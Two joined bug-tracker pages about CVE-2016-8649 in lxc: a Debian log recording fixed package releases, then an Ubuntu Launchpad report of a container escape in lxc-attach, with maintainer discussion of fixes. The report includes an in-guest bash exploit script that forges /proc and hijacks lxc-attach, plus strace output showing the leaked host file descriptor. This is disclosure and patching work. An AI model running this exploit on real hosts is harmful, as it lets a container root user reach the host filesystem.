Please adjust the affected versions in the BTS as needed.

Regards,
Salvatore

```

---

**Marked as found in versions lxc/1:1.0.6-6+deb8u3.**
Request was from `Evgeni Golov <evgeni@debian.org>`
to `control@bugs.debian.org`.
(Thu, 24 Nov 2016 07:45:02 GMT) ([full text](bugreport.cgi?bug=845465;msg=7), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=7), [link](#6)).

---

**Marked as found in versions lxc/1:1.0.6-6+deb8u4.**
Request was from `Evgeni Golov <evgeni@debian.org>`
to `control@bugs.debian.org`.
(Thu, 24 Nov 2016 07:45:05 GMT) ([full text](bugreport.cgi?bug=845465;msg=9), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=9), [link](#8)).

---

**Reply sent**
to `Evgeni Golov <evgeni@debian.org>`:

You have taken responsibility.
(Thu, 24 Nov 2016 07:51:12 GMT) ([full text](bugreport.cgi?bug=845465;msg=11), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=11), [link](#10)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Thu, 24 Nov 2016 07:51:12 GMT) ([full text](bugreport.cgi?bug=845465;msg=13), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=13), [link](#12)).

---

[Message #14](#14) received at 845465-close@bugs.debian.org ([full text](bugreport.cgi?bug=845465;msg=14), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=14), reply):

![](/cgi-bin/libravatar.cgi?email=evgeni%40debian.org)
From: Evgeni Golov <evgeni@debian.org>
To: 845465-close@bugs.debian.org
Subject: Bug#845465: fixed in lxc 1:2.0.6-1
Date: Thu, 24 Nov 2016 07:48:49 +0000
```
Source: lxc
Source-Version: 1:2.0.6-1

We believe that the bug you reported is fixed in the latest version of
lxc, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 845465@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Evgeni Golov <evgeni@debian.org> (supplier of updated lxc package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Thu, 24 Nov 2016 08:07:02 +0100
Source: lxc
Binary: lxc lxc-dev lxc-tests liblxc1 python3-lxc lua-lxc
Architecture: source
Version: 1:2.0.6-1
Distribution: unstable
Urgency: high
Maintainer: pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>
Changed-By: Evgeni Golov <evgeni@debian.org>
Description:
 liblxc1    - Linux Containers userspace tools (library)
 lua-lxc    - Linux Containers userspace tools (Lua bindings)
 lxc        - Linux Containers userspace tools
 lxc-dev    - Linux Containers userspace tools (development)
 lxc-tests  - Linux Containers userspace tools (test binaries)
 python3-lxc - Linux Containers userspace tools (Python 3.x bindings)
Closes: [844086](bugreport.cgi?bug=844086) [845465](bugreport.cgi?bug=845465)
Changes:
 lxc (1:2.0.6-1) unstable; urgency=high
 .
   * New upstream version 2.0.6
     + attach: do not send procfd to attached process
       Closes: #[845465](bugreport.cgi?bug=845465)
       [CVE-2016-8649](https://security-tracker.debian.org/tracker/CVE-2016-8649)
   * liblxc1: add depends on cgroupfs-mount | systemd (Closes: #[844086](bugreport.cgi?bug=844086))
   * drop patches applied/imported upstream
   * debian/tests: add iptables to tests depends
Checksums-Sha1:
 8f448b9149d9476ffc66320b56adf7bf10db0c4a 2602 lxc_2.0.6-1.dsc
 d69a6652ea0a5093337e5b5ef0d71e42f15fddfc 1300046 lxc_2.0.6.orig.tar.gz
 28181919b4fc08cb1ae2c06049e3fd191e8837ab 82712 lxc_2.0.6-1.debian.tar.xz
Checksums-Sha256:
 df109fc74c5fe859133d0be7609e03c359996141e11530be3be3abadb05f9d67 2602 lxc_2.0.6-1.dsc
 7c292cd0055dac1a0e6fbb6a7740fd12b6ffb204603c198faf37c11c9d6dcd7a 1300046 lxc_2.0.6.orig.tar.gz
 a65861f37bf1b92e98ebc08228b7a22c5641c1f4a5137888edf8641f9ef1f6b6 82712 lxc_2.0.6-1.debian.tar.xz
Files:
 8083b6ae51a17471c9b1252599133ffb 2602 admin optional lxc_2.0.6-1.dsc
 5fd4b7af8026e8ae20b3065ee18fe974 1300046 admin optional lxc_2.0.6.orig.tar.gz
 7bd32a48e88afba989506c83971f58e5 82712 admin optional lxc_2.0.6-1.debian.tar.xz

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEExXWpV+gZuhi/B+dmobCbQjM5YegFAlg2ltcACgkQobCbQjM5
Yeh8YxAAjcN9Iw63oZ0xnI38GnaynZ8qnlomng9yc6HUM7sQsxNCs718u/p1KQ4i
Q6v1h0alUxkJhVQth+xd9oYHS/lFKbvYbc4BBrDneB3eJv24vyMSJGqd3ad69HVw
h2HPt5RaAti24SfoDaZ0ErOZYp4GeUYvQaONP5/hg+/etbkDabzFf8kSOB17AYon
QvNPoY7Dg9S0jej6NzZbXTmnmsD2rIhSODyEelfB243EYosh+t6AQtc/9z1SWRB4
RjsiLQzyO1xJ3+qGE4aOcBruZUHs6v9DaFqyUixMi+Nj3GVLstAxgkhDVVoZ7+oF
gk+2hvqTu7juU+UJFA/KF7W7UXbD5iYkuEebH/AtoQO3floryxKm0Bu01oNshI/j
gd/C+KbYzSGa43xVwkWvHqTiYt1pJTIIAL9F+YaPLmU3cUmgv2ny9s+/o1L3ERZJ
ZzASEXqcfS4ZNsG0tflYXSQwySqiUo1Wbioyjiusx7P+FHRgoRLw2tQABbHvDddG
MEED19HZaR0WFjqGFPoZkZ4IZQPlnTybltzc8W/gLmrt3I10dssRg0lg266POnvE
A0kiSbujimivO0mAFx0flmNaD1glQycoVJIWe2Z006xtCYDvoJ8/QaNf/HAJfDO6
WialtANnWV1tdgyIF0jQqxEgPZJU+4JHcZ2UKSnRx8aduwqQrqc=
=IR8F
-----END PGP SIGNATURE-----

```

---

**Reply sent**
to `Evgeni Golov <evgeni@debian.org>`:

You have taken responsibility.
(Wed, 14 Dec 2016 21:06:11 GMT) ([full text](bugreport.cgi?bug=845465;msg=16), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=16), [link](#15)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Wed, 14 Dec 2016 21:06:11 GMT) ([full text](bugreport.cgi?bug=845465;msg=18), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=18), [link](#17)).

---

[Message #19](#19) received at 845465-close@bugs.debian.org ([full text](bugreport.cgi?bug=845465;msg=19), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=19), reply):

![](/cgi-bin/libravatar.cgi?email=evgeni%40debian.org)
From: Evgeni Golov <evgeni@debian.org>
To: 845465-close@bugs.debian.org
Subject: Bug#845465: fixed in lxc 1:1.0.6-6+deb8u5
Date: Wed, 14 Dec 2016 21:03:40 +0000
```
Source: lxc
Source-Version: 1:1.0.6-6+deb8u5

We believe that the bug you reported is fixed in the latest version of
lxc, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 845465@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Evgeni Golov <evgeni@debian.org> (supplier of updated lxc package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Format: 1.8
Date: Thu, 24 Nov 2016 08:14:36 +0100
Source: lxc
Binary: lxc lxc-dbg
Architecture: source amd64
Version: 1:1.0.6-6+deb8u5
Distribution: jessie
Urgency: medium
Maintainer: Daniel Baumann <mail@daniel-baumann.ch>
Changed-By: Evgeni Golov <evgeni@debian.org>
Description:
 lxc        - Linux Containers userspace tools
 lxc-dbg    - Linux Containers userspace tools (debug)
Closes: [845465](bugreport.cgi?bug=845465)
Changes:
 lxc (1:1.0.6-6+deb8u5) jessie; urgency=medium
 .
   * attach: do not send procfd to attached process
     Closes: #[845465](bugreport.cgi?bug=845465)
     [CVE-2016-8649](https://security-tracker.debian.org/tracker/CVE-2016-8649)
Checksums-Sha1:
 46934dc754f05f9d49de798395710a9538f80851 2096 lxc_1.0.6-6+deb8u5.dsc
 4e54a6f3e4d8a47da9d5b56cc8c8ac1f545e668f 38832 lxc_1.0.6-6+deb8u5.debian.tar.xz
 4a0470f184a50e8b2ae422696921d0bd1d7211fd 626464 lxc_1.0.6-6+deb8u5_amd64.deb
 c73f98355070c4ce9ef8fae50f973b85963400bc 774306 lxc-dbg_1.0.6-6+deb8u5_amd64.deb
Checksums-Sha256:
 dd0bf86b4ecf2afea298fe011276bd9273485e941c600bee9df17a51378a5020 2096 lxc_1.0.6-6+deb8u5.dsc
 ef8fb16916aa78a1f902a5fd465610f6901944e76fbb359e3c131180b8954d64 38832 lxc_1.0.6-6+deb8u5.debian.tar.xz
 75c3e39fd3d86a087c2ea3e5a6f4e4e87581f9d3546cc31f954d242c50c7da82 626464 lxc_1.0.6-6+deb8u5_amd64.deb
 cd32792c96b70aab46b37b3d75a80975e94908d543fe922ef03ff2a3a3eb42e2 774306 lxc-dbg_1.0.6-6+deb8u5_amd64.deb
Files:
 f1de463853b312181de134632218592f 2096 admin optional lxc_1.0.6-6+deb8u5.dsc
 4da0ce5d2cfb870b0b2a3d4203c9f1b7 38832 admin optional lxc_1.0.6-6+deb8u5.debian.tar.xz
 5eb94e3bdfd758e62d4215a122101fda 626464 admin optional lxc_1.0.6-6+deb8u5_amd64.deb
 0232a1ff861631bcce9cf0a5504d0ab3 774306 debug extra lxc-dbg_1.0.6-6+deb8u5_amd64.deb

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEst7mYDbECCn80PEM/A2xu81GC94FAlhOpQQACgkQ/A2xu81G
C96Cug/7Bpjika+M9y9dstR0I/V/TOIHjsWJm0t2c1dOlWBgAZProLnqDPd+YxFB
wxykBE5y3Adn3IVZkq5w94vyZW2FGZPKKdajEBz63KmCMEeqWm0yCOmpzv+b10S4
ObMkDmYxXLoXY1kN4/ILa8iNwmPzrw981F47XrHGjFox6l7osmjHrT9HEgAPemsl
RqYEss9M6dnNmUKQt1KcBrjF8Qx15e+4LrlW+rjJmVD2zjGo/ZQ10A4brrtpUpK5
dQKpeugs6O2o9UqM+o5fqRAB+iHALHrLmCsf3g6yH9a+DtHiMlm3coWXPXubEXwq
KMjEH6fy30GX24KmYhiup8RGKHcP1NjidXYp7FLSIumLShDIlHTJu6qOTfpBKDLM
ez74Mhz3F0UTg/eBUN6Ed3u12PaCxxVQJqNVir96jmSmhA9XItVpP1g3JTRFf1xC
iqFtooKqYTFCOWw/PSmr+alHCYl/wRfD/1TqYaHi0VWCe9tbsRgDgCLxfZmpwGXg
gKpd3c5dE1VE/Ah3GwLYsUia51nld3rD/Kb2MI5stqrnhMbO98rplJ6shMk/g9nG
P08W5VrtrdsT78p/sOi7q/0otTu4/xtjjufxz/IHdqais3r2rlzEadDitJCCuUYp
C0bi4/F8PoJKzVlrIMhEvnfkaMWk2X3uaqEy3yY/yuE2hvsgtX0=
=uEya
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Fri, 27 Jan 2017 10:33:56 GMT) ([full text](bugreport.cgi?bug=845465;msg=21), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=21), [link](#20)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=845465).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Fri Jan 24 12:12:19 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from bugs.launchpad.net_892645b9_20250124_121222.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[lxc package](https://launchpad.net/ubuntu/%2Bsource/lxc)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/lxc)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/lxc)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/lxc)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/lxc)

# lxc-attach to malicious container allows access to host

Bug #1639345 reported by
[Roman Fiedler](https://launchpad.net/~roman-fiedler-deactivatedaccount)
on 2016-11-04

[266](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [linux (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux "Latest release: 5.4.0-207.227, uploaded to main on 2025-01-21 03:36:11.159826+00:00 by Mehmet Basaran (mehmetbasaran), maintained by Ubuntu Kernel Team (kernel-team)") | Fix Released | Undecided | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [lxc (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc "Latest release: 1:6.0.3-1, uploaded to main on 2024-12-20 04:41:45.351873+00:00 by pkg-lxc (pkg-lxc-devel), maintained by pkg-lxc (pkg-lxc-devel)") | Fix Released | Critical | [Christian Brauner](https://launchpad.net/~cbrauner) |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |

### Bug Description

A malicious root user in an unprivileged container may interfere with lxc-attach to provide manipulated guest proc file system information to disable dropping of capabilities and may in the end access the host file system by winning a very easy race against lxc-attach.

In guest sequence:

cat <<EOF > /tmp/test

#!/bin/bash -e

rm -rf /test || true

mkdir -p /test/sys/kernel

echo "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0" > /test/mounts

echo 0 > /test/sys/kernel/cap\_last\_cap

mkdir -p /test/self

mknod /test/self/status p

cd /proc

mount -o bind /test /proc

while true; do

  pid=\$(ls -al \*/exe | grep lxc-attach | sed -r -e 's/.\* ([0-9]+)\\/exe ->.\*/\\1/')

  if [ "\${pid}" != "" ]; then

    cd /

    umount -i -f -l -n /proc

    exec /LxcAttachEscape "\${pid}" /bin/bash

  fi

  sleep 1

done

EOF

See attachment for LxcAttachEscape.c

Exploit uses fixed fd=7 for attacking, on other test environment, it might be other fd. Tests were performed by attacking lxc-attach started by

screen lxc-attach -n [guestname]

which is the sequence required against the TTY-stealing attacks also not fixed in all lxc-attach versions.

In my opinion two bugs might need fixing:

\* lxc-attach should not use untrusted/manipulated information for proceeding

\* kernel should prevent against ptracing of lxc-attach as it was created in another USERNS

# lsb\_release -r -d

Description: Ubuntu 16.04.1 LTS

Release: 16.04

# apt-cache policy lxc1

lxc1:

  Installed: 2.0.5-0ubuntu1~ubuntu16.04.2

  Candidate: 2.0.5-0ubuntu1~ubuntu16.04.2

  Version table:

 \*\*\* 2.0.5-0ubuntu1~ubuntu16.04.2 500

        500 <http://debarchive-ehealth.d03.arc.local/ubuntu> xenial-updates/main amd64 Packages

        100 /var/lib/dpkg/status

     2.0.0-0ubuntu2 500

        500 <http://debarchive-ehealth.d03.arc.local/ubuntu> xenial/main amd64 Packages

Tags:

[bot-stop-nagging](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=bot-stop-nagging)
[kernel-da-key](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=kernel-da-key)
[verification-done-trusty](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-trusty)
[verification-done-vivid](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-vivid)
[verification-done-xenial](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-xenial)
[verification-done-yakkety](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-yakkety)

## CVE References

* [2016-7425](/bugs/cve/2016-7425 "The arcmsr_iop_message_xfer function ...")
* [2016-8649](/bugs/cve/2016-8649 "lxc-attach in LXC before 1.0.9 and 2....")
* [2016-8655](/bugs/cve/2016-8655 "Race condition in net/packet/af_packe...")
* [2016-8658](/bugs/cve/2016-8658 "Stack-based buffer overflow in the br...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-04: |  |  | [#1](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/1) |
| --- | --- | --- | --- |

* [LxcAttachEscape.c](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615/%2Bfiles/LxcAttachEscape.c)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615)
  (2.0 KiB,
  text/x-csrc)

Exploit code for stealing of fixed fd=7 directory fd still held open by lxc-attach when entering the guest namespace.

Exploit code for stealing of fixed fd=7 directory fd still held open by lxc-attach when entering the guest namespace.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-04: |  |  | [#2](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/2) |
| --- | --- | --- | --- |

Thanks for the report, Roman. I've subscribed the LXC maintainers so that they can have a look and comment.

Thanks for the report, Roman. I've subscribed the LXC maintainers so that they can have a look and comment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-04: |  |  | [#3](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/3) |
| --- | --- | --- | --- |

Thanks for the report.

As you mentioned LXC 2.0 is now using an intermediate PTS pair to avoid attacks against the host TTY. We're also meant to be using our own copy of proc during attach, but apparently have missed a couple of places.

It's certainly our goal that lxc-attach shouldn't rely on any information coming from inside the container as that can be indeed modified by the user to attack a root process attaching to the container.

Thanks for the report.
As you mentioned LXC 2.0 is now using an intermediate PTS pair to avoid attacks against the host TTY. We're also meant to be using our own copy of proc during attach, but apparently have missed a couple of places.
It's certainly our goal that lxc-attach shouldn't rely on any information coming from inside the container as that can be indeed modified by the user to attack a root process attaching to the container.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-04: |  |  | [#4](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/4) |
| --- | --- | --- | --- |

As for the kernel side of this, I believe Eric Biederman is aware of this particular problem and looking into options to restrict ptrace of processes crossing userns boundaries.

As for the kernel side of this, I believe Eric Biederman is aware of this particular problem and looking into options to restrict ptrace of processes crossing userns boundaries.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-04: |  |  | [#5](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/5) |
| --- | --- | --- | --- |

A workaround we're now considering for the ptrace issue is to have attach() call ptrace on itself, therefore preventing any other program from ptracing it (since you can't ptrace something that's being ptraced).

A workaround we're now considering for the ptrace issue is to have attach() call ptrace on itself, therefore preventing any other program from ptracing it (since you can't ptrace something that's being ptraced).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-05: |  |  | [#6](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/6) |
| --- | --- | --- | --- |

I've been working on the ptrace fix and so far I haven't found a non-racy version of this. Even in the case where it blocks the ptrace from inside the container we end up in interruptible sleep and hang forever on waitpid().

I've been working on the ptrace fix and so far I haven't found a non-racy version of this. Even in the case where it blocks the ptrace from inside the container we end up in interruptible sleep and hang forever on waitpid().

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-05: |  |  | [#7](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/7) |
| --- | --- | --- | --- |

Hi Roman, can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7. The ptrace part is reproducible but I'm not sure that we can reliably prevent this without fixing this in the kernel. The second part, opening a prepared fd I can't seem to reproduce but maybe I'm just missing some crucial details. It would be good if you could outline the exact steps needed to reproduce this issue.

Hi Roman, can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7. The ptrace part is reproducible but I'm not sure that we can reliably prevent this without fixing this in the kernel. The second part, opening a prepared fd I can't seem to reproduce but maybe I'm just missing some crucial details. It would be good if you could outline the exact steps needed to reproduce this issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-06: |  |  | [#8](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/8) |
| --- | --- | --- | --- |

I was chatting with Eric yesterday and he mentioned this patch in his next branch which may address the ptrace issue from the kernel point of view (which would make this a kernel security issue):

<https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&id=2e41414828bb0b066bde2f156cfa848c38531edf>

It'd be good if someone could build a kernel with this patch applied and see if this resolves the ptrace issue.

I was chatting with Eric yesterday and he mentioned this patch in his next branch which may address the ptrace issue from the kernel point of view (which would make this a kernel security issue):
https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&id=2e41414828bb0b066bde2f156cfa848c38531edf
It'd be good if someone could build a kernel with this patch applied and see if this resolves the ptrace issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-07: |  |  | [#9](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/9) |
| --- | --- | --- | --- |

@Christian Brauner (comment #7):

> can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7.

The fd=7 is just the directory-fd pointing to /proc/[pid] on the HOST. It seems that lxc-attach keeps it open to access the host side /proc/[pid] resources even after setns().

If you do a "strace -s256 -f screen lxc-attch -n name" (without your self-ptrace patch), you can find following calls:

# This is still in initns, here the fd=7 is created. The number might be different for SSH logins, screen session, bash vs other shell ....

[pid 1712] open("/proc", O\_RDONLY|O\_DIRECTORY) = 7

... immediately afterwards

[pid 1712] open("/proc/1632/ns/user", O\_RDONLY|O\_CLOEXEC) = 9

[pid 1712] open("/proc/1632/ns/mnt", O\_RDONLY|O\_CLOEXEC) = 10

...

# now use the ns-fds, thus changing the root to reside in container

[pid 1712] setns(9, 0) = 0

[pid 1712] close(9) = 0

[pid 1712] setns(10, 0) = 0

...

# later on after changing to guest-ns uid=0, the fd is used.

[pid 1713] openat(7, "self/attr/current", O\_RDWR) = 8

[pid 1713] write(8, "changeprofile lxc-container-default-cgns\0", 41) = 41

The ptrace part just makes lxc-attach close the wrong file descriptor (not 7) before executing the guest command (/bin/sh), thus giving access to the open fd=7 via guest proc filesystem.

A full, failsafe exploit should try to infere the correct fd-number to search for or use the fixed stack offsets, they seem to be quite reliable.

@Christian Brauner (comment #7):
> can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7.
The fd=7 is just the directory-fd pointing to /proc/[pid] on the HOST. It seems that lxc-attach keeps it open to access the host side /proc/[pid] resources even after setns().
If you do a "strace -s256 -f screen lxc-attch -n name" (without your self-ptrace patch), you can find following calls:
# This is still in initns, here the fd=7 is created. The number might be different for SSH logins, screen session, bash vs other shell ....
[pid 1712] open("/proc", O\_RDONLY|O\_DIRECTORY) = 7
... immediately afterwards
[pid 1712] open("/proc/1632/ns/user", O\_RDONLY|O\_CLOEXEC) = 9
[pid 1712] open("/proc/1632/ns/mnt", O\_RDONLY|O\_CLOEXEC) = 10
...
# now use the ns-fds, thus changing the root to reside in container
[pid 1712] setns(9, 0) = 0
[pid 1712] close(9) = 0
[pid 1712] setns(10, 0) = 0
...
# later on after changing to guest-ns uid=0, the fd is used.
[pid 1713] openat(7, "self/attr/current", O\_RDWR) = 8
[pid 1713] write(8, "changeprofile lxc-container-default-cgns\0", 41) = 41
The ptrace part just makes lxc-attach close the wrong file descriptor (not 7) before executing the guest command (/bin/sh), thus giving access to the open fd=7 via guest proc filesystem.
A full, failsafe exploit should try to infere the correct fd-number to search for or use the fixed stack offsets, they seem to be quite reliable.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-07: |  |  | [#10](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/10) |
| --- | --- | --- | --- |

Ok, so for the second part, preventing the /proc attack. We need the procfd to the host's namespace so that we can set the lsm label later on in attach\_child\_main(). The obvious solution that we've shortly discussed at Plumbers is to mount a fresh proc in a new mount and pid namespace. However, we cannot simply unshare(CLONE\_NEWNS|CLONE\_NEWPID) and then umount /proc since we then are not really part of the pid namespace and that leads to all sorts of complications. You can try that out with

unshare -Ump --mount-proc -- sh

mounting a fresh /proc seems to only work correctly if you fork()/clone() first. That's why I suspect that the cleanest solution is to create a minimal namespace (similar to the lxcfs solution), mount /proc in there and then open an fd to that. In essence, this would mean that we would have to lxc\_clone(chroot\_us\_and\_clone\_again, ..., CLONE\_PARENT) in and chroot us, and then call lxc\_clone(attach\_child\_main, &payload, CLONE\_PARENT) within chroot\_us\_and\_clone\_again() to exec the actual process we want to run in the container. We would effectively create an additional 4th process in attach. This \*could\* work: Due to CLONE\_PARENT both processes should have the same parent and we should be able to selectively wait on our chroot\_us\_and\_clone\_again() child in lxc\_attach() while handing back the PID of the exec'ing process back to our caller. So that when someone straces us and finds a way to escape to the namespace of lxc\_attach() he would effectively find himself safely chrooted.

Ok, so for the second part, preventing the /proc attack. We need the procfd to the host's namespace so that we can set the lsm label later on in attach\_child\_main(). The obvious solution that we've shortly discussed at Plumbers is to mount a fresh proc in a new mount and pid namespace. However, we cannot simply unshare(CLONE\_NEWNS|CLONE\_NEWPID) and then umount /proc since we then are not really part of the pid namespace and that leads to all sorts of complications. You can try that out with
unshare -Ump --mount-proc -- sh
mounting a fresh /proc seems to only work correctly if you fork()/clone() first. That's why I suspect that the cleanest solution is to create a minimal namespace (similar to the lxcfs solution), mount /proc in there and then open an fd to that. In essence, this would mean that we would have to lxc\_clone(chroot\_us\_and\_clone\_again, ..., CLONE\_PARENT) in and chroot us, and then call lxc\_clone(attach\_child\_main, &payload, CLONE\_PARENT) within chroot\_us\_and\_clone\_again() to exec the actual process we want to run in the container. We would effectively create an additional 4th process in attach. This \*could\* work: Due to CLONE\_PARENT both processes should have the same parent and we should be able to selectively wait on our chroot\_us\_and\_clone\_again() child in lxc\_attach() while handing back the PID of the exec'ing process back to our caller. So that when someone straces us and finds a way to escape to the namespace of lxc\_attach() he would effectively find himself safely chrooted.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-08: |  |  | [#11](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/11) |
| --- | --- | --- | --- |

OK, but sounds complicated.

I'm not sure if that could work, but what about...

\* Create a helper mount namespace from init-ns where everything needed after setns(guestns) is bind-mounted and where everything else is unmounted. Not sure if chroot/pivot\_root would be needed here to cleanup.

\* Open a directory fd to the root of this helper mountns

\* Enter the final user/mount ns as implemented now. This should work even when guest-ns is not parent of helper-ns as process is privileged in init-ns (not 100% sure about that). The helper-ns would not be the mount ns of any living process any more and should be purged, when the directory fd is closed.

\* After entering the guestns process has only limited means to modify the content in the helper-ns as it does not live in the parent-ns of the helper-ns.

Could that be a generic concept to get around the sequence of clone() calls?

OK, but sounds complicated.
I'm not sure if that could work, but what about...
\* Create a helper mount namespace from init-ns where everything needed after setns(guestns) is bind-mounted and where everything else is unmounted. Not sure if chroot/pivot\_root would be needed here to cleanup.
\* Open a directory fd to the root of this helper mountns
